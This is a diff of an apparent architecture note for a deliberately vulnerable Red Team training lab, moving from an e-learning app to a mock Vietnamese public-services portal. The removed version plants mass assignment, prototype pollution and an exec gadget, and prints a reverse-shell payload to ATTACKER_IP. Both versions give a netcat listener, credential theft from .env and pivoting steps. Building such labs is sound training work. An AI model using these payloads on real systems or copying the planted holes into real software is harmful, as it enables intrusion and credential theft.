@@ -1,92 +1,52 @@
-# React2Shell (CVE-2025-55182) Lab Development - Session Context
-**Updated:** June 11, 2026
-**Project:** e-learning-ui (Cyber Range Lab)
+# React2Shell (CVE-2025-55182) Lab — Architecture Context
+**Updated:** June 30, 2026
+**Project:** dichvucong-portal (Cyber Range Lab — Cổng Dịch vụ công)
 
-## 1. Project Status & Architecture
-The project has been successfully upgraded from a static UI prototype to a functional, full-stack application designed specifically as a Red Team target.
+## 1. Trạng thái & Kiến trúc
+Ứng dụng mô phỏng **Cổng Dịch vụ công** (tham khảo trang Tra cứu hồ sơ của Cổng Dịch vụ công Quốc gia), được vũ khí hóa làm mục tiêu Red Team.
 
-*   **Framework:** Next.js 16.2.4 (React 19.2.5)
-*   **Database:** PostgreSQL (via Prisma 7.8.0 ORM with `@prisma/adapter-pg`)
-*   **Authentication:** NextAuth v5 (Credentials Provider with bcryptjs)
-*   **Routing:** Edge-level RBAC implemented in `middleware.ts` + `auth.config.ts`.
+*   **Framework:** Next.js 15.0.3 (React 19.0.0-rc) — *cố ý dính CVE-2025-55182*
+*   **Database:** PostgreSQL (Prisma 7.8.0 + `@prisma/adapter-pg`)
+*   **Auth:** NextAuth v5 (Credentials + bcryptjs)
+*   **Routing/RBAC:** `middleware.ts` + `auth.config.ts`
 
-### Network Topology (Target State)
-*   **Public Network:** Web Server (Port 3000)
-*   **Internal Network:** Database Server (`172.20.0.5`) - Contains sensitive credentials in `.env`.
+### Route công khai vs bảo vệ
+*   **Công khai:** `/`, `/login`, `/register`
+*   **Bảo vệ (yêu cầu đăng nhập):** `/tra-cuu` ← chứa lỗ hổng
 
-## 2. The Vulnerability Chain (The Kill Chain)
-The environment has been weaponized with a multi-stage attack path.
+## 2. Lỗ hổng (Kill Chain)
 
-### Stage 1: Initial Access & Privilege Escalation
-*   **Entry:** Attacker registers a new account via `/register` (Enforced as `STUDENT` server-side).
-*   **Vulnerability:** IDOR & Mass Assignment in `updateUserProfile` (`lib/actions/user.ts`).
-*   **Exploitation:** Attacker intercepts the profile update request (e.g., via `/student/settings` or Burp) and injects `"role": "LECTURER"`.
-*   **Result:** Attacker escalates privileges to Lecturer, gaining access to `createAssignment` Server Action. Note: Escalation to `ADMIN` is intentionally blocked.
+### Giai đoạn 1: Lấy quyền truy cập (Đăng nhập bắt buộc)
+*   Đăng ký công dân tại `/register` (ép vai trò `CONG_DAN` phía server) hoặc dùng tài khoản mẫu.
+*   Đăng nhập tại `/login` để lấy `authjs.session-token`.
+*   Cookie này cần thiết để vượt qua middleware bảo vệ `/tra-cuu`.
 
-### Stage 2: Insecure Deserialization (Prototype Pollution)
-*   **Entry:** Attacker (now LECTURER) calls the `createAssignment` Server Action.
-*   **Vulnerability:** Prototype Pollution in `lib/utils/unsafeMerge.ts` (`deepMerge` function lacks `__proto__` / `constructor` / `prototype` sanitization).
-*   **Injection Point:** `createAssignment` action (`lib/actions/assignment.ts`) merges user-provided JSON metadata via `deepMerge(baseMetadata, meta)`.
-*   **Exploitation:** Attacker sends a JSON payload containing `__proto__` to pollute the global `Object.prototype`.
+### Giai đoạn 2: Insecure Deserialization cấp framework (React2Shell)
+*   **Điểm vào:** Server Action `traCuuHoSo` trên route `/tra-cuu` (`lib/actions/lookup.ts`).
+*   **Bản chất:** Lỗi nằm trong React Flight deserializer (`decodeReply`) của Next.js 15.0.3 / React 19.0.0-rc — KHÔNG phải lỗi tầng ứng dụng.
+*   **Cơ chế:** Truy cập thuộc tính bằng bracket notation đi xuyên prototype chain → chạm tới `constructor` → lấy Global `Function` constructor → thực thi code trong `_prefix`.
+*   Việc deserialize xảy ra **trước khi** thân hàm `traCuuHoSo` chạy → RCE.
 
-### Stage 3: Remote Code Execution (Command Template Pollution)
-*   **Gadget:** A `child_process.exec` call in `createAssignment` designed for background logging. It reads a `logCommand` property from the metadata object. Since `Object.prototype` has been polluted, the attacker's command is executed instead of the default echo.
-*   **Code (current):**
-    ```typescript
-    // assignment.ts — RCE gadget
-    const logCommand = (baseMetadata as any).logCommand
-      || `echo "[$(date)] Assignment created: ${title}" >> /tmp/assignment_logs.txt`;
-    
-    exec(logCommand, (error) => {
-      if (error) console.error("Background logging failed:", error.message);
-    });
-    ```
-*   **Why this works:** `deepMerge(baseMetadata, { __proto__: { logCommand: "..." } })` writes to `Object.prototype.logCommand`. When the code reads `(baseMetadata as any).logCommand`, it traverses the prototype chain and finds the attacker's value.
-*   **Node.js 24 Compatibility:** This gadget works on all Node.js versions because it uses direct command injection into `exec()`, not `NODE_OPTIONS` or `--require`/`--import` flags.
+### Giai đoạn 3: Post-Exploitation
+*   `cat .env` để lộ thông tin hạ tầng nội bộ (`DB_INTERNAL_HOST`, `DB_USER`, `DB_PASS`).
+*   Pivot bằng Chisel/SSH tunnel tới PostgreSQL nội bộ.
 
-### Stage 4: Post-Exploitation
-*   **Credential Harvest:** `cat .env` reveals internal DB credentials (`DB_INTERNAL_HOST`, `DB_USER`, `DB_PASS`).
-*   **Pivoting:** Use Chisel or SSH dynamic port forwarding through the compromised web server to reach the internal PostgreSQL at `172.20.0.5`.
-*   **Persistence:** Crontab entry for automatic reverse shell reconnection every 5 minutes.
+## 3. PoC tham khảo
+https://github.com/kOaDT/poc-cve-2025-55182 — payload `multipart/form-data` với `then/_response/_prefix/constructor`. Chi tiết: `Lab_Walkthrough.md`.
 
-## 3. Verified Exploit Path (Final PoC)
-1.  **Register/Login** as a Student via `/register` → `/login`.
-2.  **Escalate** to Lecturer via Mass Assignment — call `updateUserProfile(myUserId, { role: "LECTURER" })` via Burp.
-3.  **Re-login** to refresh the session with the new LECTURER role.
-4.  **Pollute & RCE** by creating an assignment with a malicious JSON payload:
-    ```json
-    {
-      "title": "Final Exam",
-      "dueDate": "2026-06-30",
-      "__proto__": {
-        "logCommand": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
-      }
-    }
-    ```
-5.  **Trigger:** The `createAssignment` action merges the payload via `deepMerge()`, polluting `Object.prototype.logCommand`. The subsequent `exec(logCommand)` call executes the attacker's reverse shell command.
+## 4. File chính
 
-## 4. Key Files
-
-| File | Role |
+| File | Vai trò |
 |---|---|
-| `lib/actions/user.ts` | IDOR + Mass Assignment (STUDENT → LECTURER) |
-| `lib/utils/unsafeMerge.ts` | Prototype Pollution (no `__proto__` sanitization) |
-| `lib/actions/assignment.ts` | RCE gadget (`exec(logCommand)` with LECTURER auth gate) |
-| `lib/actions/register.ts` | Secure registration (enforced STUDENT role) |
-| `auth.config.ts` | Middleware RBAC (public routes: `/login`, `/register`, `/`) |
-| `.env` | Contains internal DB credentials for pivoting |
-| `trigger_rce.ts` | Standalone PoC script for dry-run testing |
+| `lib/actions/lookup.ts` | Server Action `traCuuHoSo` — điểm vào React2Shell (có auth gate) |
+| `app/tra-cuu/page.tsx` | Route bảo vệ chứa form tra cứu |
+| `components/portal/TraCuuForm.tsx` | Form client gọi Server Action (useActionState) |
+| `lib/actions/register.ts` | Đăng ký an toàn (ép vai trò CONG_DAN) |
+| `auth.config.ts` | Middleware RBAC (public: `/`, `/login`, `/register`) |
+| `.env` | Chứa credential nội bộ để pivot |
 
-## 5. Useful Commands
-*   Start Server: `npm run dev`
+## 5. Lệnh hữu ích
+*   Dev: `npm run dev`
 *   Build: `npm run build`
-*   Extract Server Action IDs: `cat .next/server/server-reference-manifest.json | grep -B5 "createAssignment"`
-*   Test Prototype Pollution locally:
-    ```bash
-    node -e "
-    function deepMerge(t,s){for(const k in s){if(typeof s[k]==='object'&&s[k]!==null){if(!t[k])t[k]={};deepMerge(t[k],s[k])}else{t[k]=s[k]}}return t}
-    const o={};deepMerge(o,JSON.parse('{\"__proto__\":{\"logCommand\":\"id\"}}'));
-    console.log(({}).logCommand)
-    "
-    ```
-*   Start listener: `nc -lvnp 4444`
+*   Trích Action ID: `cat .next/server/server-reference-manifest.json | grep -B5 "traCuuHoSo"`
+*   Listener: `nc -lvnp 4444`
